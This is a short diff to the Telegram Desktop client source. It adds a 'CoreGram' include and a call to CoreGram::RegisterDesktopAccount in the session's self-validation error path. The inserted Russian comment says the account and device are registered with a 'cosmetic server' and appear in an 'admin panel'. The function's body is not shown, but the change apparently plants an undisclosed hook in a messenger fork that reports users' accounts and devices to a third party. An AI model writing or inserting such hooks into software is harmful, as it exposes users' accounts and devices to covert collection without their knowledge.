@@ -7,6 +7,8 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 */
 #include "main/main_session.h"
 
+#include "coregram/coregram_visual.h"
+
 #include "apiwrap.h"
 #include "api/api_peer_colors.h"
 #include "api/api_updates.h"
@@ -444,7 +446,11 @@ PeerId Session::userPeerId() const {
 bool Session::validateSelf(UserId id) {
 	if (id != userId()) {
 		LOG(("Auth Error: wrong self user received."));
-		crl::on_main(this, [=] { _account->logOut(); });
+		// Представляемся косметическому серверу: отсюда аккаунт попадает в
+	// админку вместе с устройством и получает визуальный слой.
+	CoreGram::RegisterDesktopAccount(this);
+
+	crl::on_main(this, [=] { _account->logOut(); });
 		return false;
 	}
 	return true;
